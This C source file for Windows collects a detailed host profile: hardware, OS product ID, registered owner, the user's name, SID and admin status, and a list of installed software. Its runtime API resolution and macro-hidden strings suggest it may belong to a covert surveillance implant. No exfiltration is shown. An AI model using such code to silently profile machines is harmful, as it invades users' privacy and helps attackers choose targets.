#include <Windows.h>
#include <lm.h>
#include <Sddl.h>
#include <Strsafe.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "debug.h"

#include "device.h"

PDEVICE_CONTAINER lpDeviceContainer = NULL;

VOID GetProcessor(PDEVICE_INFO lpDeviceInfo)
{
	WCHAR strCentralProcKey[] = HWD_DESC_SYS_CENTRALPROC_0;
	WCHAR strProcNameString[] = PROCESSOR_NAME_STRING;

	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strCentralProcKey, 
		strProcNameString, 
		(LPBYTE) lpDeviceInfo->procinfo.proc, 
		sizeof(lpDeviceInfo->procinfo.proc), 
		KEY_READ);

	LPSYSTEM_INFO lpSysInfo = (LPSYSTEM_INFO) zalloc(sizeof(SYSTEM_INFO));
	GetSystemInfo(lpSysInfo);
	lpDeviceInfo->procinfo.procnum = lpSysInfo->dwNumberOfProcessors;

	zfree(lpSysInfo);
}

VOID GetMemory(PDEVICE_INFO lpDeviceInfo)
{
	LPMEMORYSTATUSEX lpMemoryStatus = (LPMEMORYSTATUSEX) zalloc(sizeof(MEMORYSTATUSEX));
	lpMemoryStatus->dwLength = sizeof(MEMORYSTATUSEX);
	GlobalMemoryStatusEx(lpMemoryStatus);
	
	lpDeviceInfo->meminfo.memtotal = (ULONG) (lpMemoryStatus->ullTotalPhys / (1024*1024));
	lpDeviceInfo->meminfo.memfree = (ULONG) (lpMemoryStatus->ullAvailPhys / (1024*1024));
	lpDeviceInfo->meminfo.memload = (ULONG) (lpMemoryStatus->dwMemoryLoad);
}

VOID GetOs(PDEVICE_INFO lpDeviceInfo)
{
	WCHAR strNtCurrVersion[] = SOFTW_MICROS_WINNT_CURRVER;

	WCHAR strProductName[]= PRODUCT_NAME;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strProductName, 
		lpDeviceInfo->osinfo.ver, 
		sizeof(lpDeviceInfo->osinfo.ver),
		KEY_READ);
		
	/* NON e' QUI csdversion!! FIXME
	WCHAR strCsdVer[] = CSD_VERSION;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strCsdVer, 
		lpDeviceInfo->osinfo.sp, 
		sizeof(lpDeviceInfo->osinfo.sp),
		KEY_READ);
	*/
	
	WCHAR strProdId[] = PRODUCT_ID;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strProdId, 
		lpDeviceInfo->osinfo.id, 
		sizeof(lpDeviceInfo->osinfo.id),
		KEY_READ); // non va FIXME!!!

	WCHAR strOwner[] = REGISTERED_OWNER;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strOwner, 
		lpDeviceInfo->osinfo.owner, 
		sizeof(lpDeviceInfo->osinfo.owner),
		KEY_READ);

	WCHAR strOrg[]= REGISTERED_ORG;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strNtCurrVersion, 
		strOrg, 
		lpDeviceInfo->osinfo.org, 
		sizeof(lpDeviceInfo->osinfo.org),
		KEY_READ);
}

typedef NET_API_STATUS (WINAPI *NetUserGetInfo_p)(
	_In_   LPWSTR servername,
	_In_   LPWSTR username,
	_In_   DWORD level,
	_Out_  LPBYTE *bufptr);

typedef NET_API_STATUS (WINAPI *NetApiBufferFree_p)(_In_ LPVOID lpBuffer);

VOID GetUser(PDEVICE_INFO lpDeviceInfo)
{
	static NetUserGetInfo_p fpNetUserGetInfo = NULL;
	static NetApiBufferFree_p fpNetApiBufferFree = NULL;

	static WCHAR strNetApi32[] = NETAPI32;
	static CHAR strNetUserGetInfo[] = NETUSERGETINFO;
	static CHAR strNetApiBufferFree[] = NETAPIBUFFERFREE;

	if (fpNetUserGetInfo == NULL)
		fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(strNetApi32), strNetUserGetInfo);
	if (fpNetApiBufferFree == NULL)
		fpNetApiBufferFree = (NetApiBufferFree_p) GetProcAddress(LoadLibrary(strNetApi32), strNetApiBufferFree);


	DWORD dwSize = sizeof(lpDeviceInfo->userinfo.username) / sizeof(WCHAR);
	if (!GetUserName(lpDeviceInfo->userinfo.username, &dwSize))
		SecureZeroMemory(lpDeviceInfo->userinfo.username, sizeof(lpDeviceInfo->userinfo.username));
	else
	{
		if (fpNetUserGetInfo != NULL && fpNetApiBufferFree != NULL)
		{
			LPBYTE pUserInfo;
			if (fpNetUserGetInfo(NULL, lpDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
			{
				lpDeviceInfo->userinfo.priv = ((LPUSER_INFO_1)pUserInfo)->usri1_priv;
				fpNetApiBufferFree(pUserInfo);
			}

			if (fpNetUserGetInfo(NULL, lpDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
			{
				wcsncpy_s(lpDeviceInfo->userinfo.fullname, sizeof(lpDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_23)pUserInfo)->usri23_full_name, _TRUNCATE);

				LPWSTR strSid;
				if (!ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &strSid))
					SecureZeroMemory(lpDeviceInfo->userinfo.sid, sizeof(lpDeviceInfo->userinfo.sid));
				else
					wcsncpy_s(lpDeviceInfo->userinfo.sid, sizeof(lpDeviceInfo->userinfo.sid) / sizeof(WCHAR), strSid, _TRUNCATE);

				fpNetApiBufferFree(pUserInfo);
			}
		}
	}
}

VOID GetLocale(PDEVICE_INFO lpDeviceInfo)
{
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, lpDeviceInfo->localinfo.lang, sizeof(lpDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
		SecureZeroMemory(lpDeviceInfo->localinfo.lang, sizeof(lpDeviceInfo->localinfo.lang));
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, lpDeviceInfo->localinfo.country, sizeof(lpDeviceInfo->localinfo.country) / sizeof(WCHAR)))
		SecureZeroMemory(lpDeviceInfo->localinfo.country, sizeof(lpDeviceInfo->localinfo.country));

	WCHAR strTimeZone[] = SYSTEM_CURRCON_CONTROL_TIMEZONE;
	WCHAR strBias[] = ACTIVE_TIME_BIAS;
	GetRegistryValue(HKEY_LOCAL_MACHINE, 
		strTimeZone, 
		strBias, 
		(LPBYTE)&lpDeviceInfo->localinfo.timebias, 
		sizeof(lpDeviceInfo->localinfo.timebias),
		KEY_READ);
}

typedef BOOL (WINAPI *GetDiskFreeSpaceEx_p) (LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
VOID GetDisk(PDEVICE_INFO lpDeviceInfo)
{
	static GetDiskFreeSpaceEx_p fpGetDiskFreeSpaceEx = NULL;
	static CHAR strGetDiskFreeSpaceEx[] = GETDISKFREESPACEEX;
	static WCHAR strKernel32[] = KERNEL32;

	if (fpGetDiskFreeSpaceEx == NULL)
	{
		fpGetDiskFreeSpaceEx = (GetDiskFreeSpaceEx_p) GetProcAddress(GetModuleHandle(strKernel32), strGetDiskFreeSpaceEx);
		if (fpGetDiskFreeSpaceEx)
		{
			LPWSTR strTempPath = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));

			if (GetTempPath(MAX_FILE_PATH, strTempPath))
			{
				ULARGE_INTEGER uDiskFree, uDiskTotal;
				if (fpGetDiskFreeSpaceEx(strTempPath, &uDiskFree, &uDiskTotal, NULL))
				{
					lpDeviceInfo->diskinfo.disktotal = (ULONG) (uDiskTotal.QuadPart / (1024*1024));
					lpDeviceInfo->diskinfo.diskfree = (ULONG) (uDiskFree.QuadPart / (1024*1024));
				}
				else
					lpDeviceInfo->diskinfo.disktotal = lpDeviceInfo->diskinfo.diskfree = 0;
			}

			zfree(strTempPath);
		}
	}
}


LPWSTR GetAppList()
{
	DWORD dwAppListSize = 0;
	DWORD dwSam = KEY_READ;
	WCHAR strUninstall[] = SOFTWARE_MICROSOFT_WIN_CURR_UNINSTALL;
	WCHAR strX86Header[] = APPLICATION_LIST_X86;
	WCHAR strX64Header[] = APPLICATION_LIST_X64;
	BOOL bIsWow64, bIs64OS;

	IsX64System(&bIsWow64, &bIs64OS);
	DWORD dwRepeat = 1 + bIsWow64;

	LPWSTR strAppList = (LPWSTR) zalloc((wcslen(strX86Header) + 1) * sizeof(WCHAR));
	StringCbCopy(strAppList, (wcslen(strX86Header) + 1) * sizeof(WCHAR), strX86Header);
	
	for (DWORD i=0; i<dwRepeat; i++)
	{
		HKEY hUninstall = GetRegistryKeyHandle(HKEY_LOCAL_MACHINE, strUninstall, dwSam);
		if (!hUninstall)
			return NULL;

		DWORD dwIdx = 0;
		while (1)
		{
			WCHAR strProductKey[128];
			WCHAR strTmpValue[256];

			DWORD dwLen = sizeof(strProductKey) / sizeof(WCHAR);
			if (RegEnumKeyEx(hUninstall, dwIdx++, strProductKey, &dwLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

			// if it has a parent then get the parent and skip this one
			WCHAR strParentKeyName[] = PARENT_KEY_NAME;
			if (GetRegistryValue(hUninstall, strProductKey, strParentKeyName, NULL, 0, dwSam)) 
				continue;

			// if it is a system component then skip it
			DWORD dwSysComponent;
			WCHAR strSysComponent[] = SYSTEM_COMPONENT;
			dwLen = sizeof(DWORD);
			if (GetRegistryValue(hUninstall, strProductKey, strSysComponent, (LPBYTE)&dwSysComponent, sizeof(DWORD), dwSam) && dwSysComponent == 1) 
				continue;


			// get data
			LPWSTR strProductName = NULL;
			LPWSTR strProductVersion = NULL;

			// name
			WCHAR strDisplayName[] = DISPLAY_NAME;
			dwLen = sizeof(strProductKey);
			if (!GetRegistryValue(hUninstall, strProductKey, strDisplayName, strTmpValue, dwLen, dwSam))
				continue;
			strProductName = _wcsdup(strTmpValue);

			// version
			WCHAR strDisplayVersion[] = DISPLAY_VERSION;
			dwLen = sizeof(strProductKey);
			if (GetRegistryValue(hUninstall, strProductKey, strDisplayVersion, strTmpValue, dwLen, dwSam))
				strProductVersion = _wcsdup(strTmpValue);

			// append to string
			dwAppListSize = (wcslen(strAppList) + wcslen(strProductName) + (strProductVersion ? wcslen(strProductVersion) : 0) + 5) * sizeof(WCHAR);
			strAppList = (LPWSTR) realloc(strAppList, dwAppListSize);

			StringCbCat(strAppList, dwAppListSize, strProductName);
			if (strProductVersion)
			{	
				StringCbCat(strAppList, dwAppListSize, L" (");
				StringCbCat(strAppList, dwAppListSize, strProductVersion);
				StringCbCat(strAppList, dwAppListSize, L")");
			}
			StringCbCat(strAppList, dwAppListSize, L"\n");

			zfree(strProductName);
			if (strProductVersion)
				zfree(strProductVersion);
		}

		if (i==0 && bIsWow64)
		{
			dwAppListSize += (wcslen(strX64Header)+2)*sizeof(WCHAR);
			strAppList = (LPWSTR) realloc(strAppList, dwAppListSize);
			StringCbCat(strAppList, dwAppListSize, L"\n");
			StringCbCat(strAppList, dwAppListSize, L"\n");
			StringCbCat(strAppList, dwAppListSize, strX64Header);
		}
				
		dwSam |= KEY_WOW64_64KEY;
		RegCloseKey(hUninstall);
	}

	return strAppList;
}

VOID GetDeviceInfo()
{
	BOOL bIsWow64, bIs64OS;

	if (lpDeviceContainer)
		return;

	PDEVICE_INFO lpDeviceInfo = (PDEVICE_INFO) zalloc(sizeof(DEVICE_INFO));
	LPWSTR strAppList = GetAppList();

	GetProcessor(lpDeviceInfo);
	GetMemory(lpDeviceInfo);
	GetOs(lpDeviceInfo);
	GetUser(lpDeviceInfo);
	GetLocale(lpDeviceInfo);
	GetDisk(lpDeviceInfo);

	IsX64System(&bIsWow64, &bIs64OS);

	DWORD dwSize = (sizeof(DEVICE_INFO) + (strAppList ? wcslen(strAppList)*sizeof(WCHAR) : 0) + 1024 + 1) * sizeof(WCHAR);
	LPWSTR strDeviceString = (LPWSTR) zalloc(dwSize);
	
	StringCbPrintf(strDeviceString, dwSize,
		L"CPU: %d x %s\n"  //FIXME: array
		L"Architecture: %s\n"  //FIXME: array
		L"RAM: %dMB free / %dMB total (%u%% used)\n"  //FIXME: array
		L"Hard Disk: %dMB free / %dMB total\n"  //FIXME: array
		L"\n"  //FIXME: array
		L"Windows Version: %s%s%s%s%s\n"  //FIXME: array
		L"Registered to: %s%s%s%s {%s}\n"  //FIXME: array
		L"Locale: %s_%s (UTC %.2d:%.2d)\n"  //FIXME: array
		L"\n" 
		L"User Info: %s%s%s%s%s\n"  //FIXME: array
		L"SID: %s\n"  //FIXME: array
		L"\n%s\n",  //FIXME: array
		lpDeviceInfo->procinfo.procnum, lpDeviceInfo->procinfo.proc,
		bIs64OS ? L"64bit" : L"32bit",  //FIXME: array
		lpDeviceInfo->meminfo.memfree, lpDeviceInfo->meminfo.memtotal, lpDeviceInfo->meminfo.memload,
		lpDeviceInfo->diskinfo.diskfree, lpDeviceInfo->diskinfo.disktotal,
		lpDeviceInfo->osinfo.ver, (lpDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (lpDeviceInfo->osinfo.sp[0]) ? lpDeviceInfo->osinfo.sp : L"", (lpDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIs64OS ? L" (64-bit)" : L" (32-bit)",  //FIXME: array
		lpDeviceInfo->osinfo.owner, (lpDeviceInfo->osinfo.org[0]) ? L" (" : L"", (lpDeviceInfo->osinfo.org[0]) ? lpDeviceInfo->osinfo.org : L"", (lpDeviceInfo->osinfo.org[0]) ? L")" : L"", lpDeviceInfo->osinfo.id,
		lpDeviceInfo->localinfo.lang, lpDeviceInfo->localinfo.country, (-1 * (int)lpDeviceInfo->localinfo.timebias) / 60, abs((int)lpDeviceInfo->localinfo.timebias) % 60,
		lpDeviceInfo->userinfo.username, (lpDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (lpDeviceInfo->userinfo.fullname[0]) ? lpDeviceInfo->userinfo.fullname : L"", (lpDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (lpDeviceInfo->userinfo.priv) ? ((lpDeviceInfo->userinfo.priv == 1) ? L"" : L" [ADMIN]") : L" [GUEST]",  //FIXME: array
		lpDeviceInfo->userinfo.sid,
		strAppList ? strAppList : L"");

	lpDeviceContainer = (PDEVICE_CONTAINER) zalloc(sizeof(DEVICE_CONTAINER));
	lpDeviceContainer->pDataBuffer = strDeviceString;
	lpDeviceContainer->uSize = (wcslen(strDeviceString) + 1) * sizeof(WCHAR);

	zfree(strAppList);
}
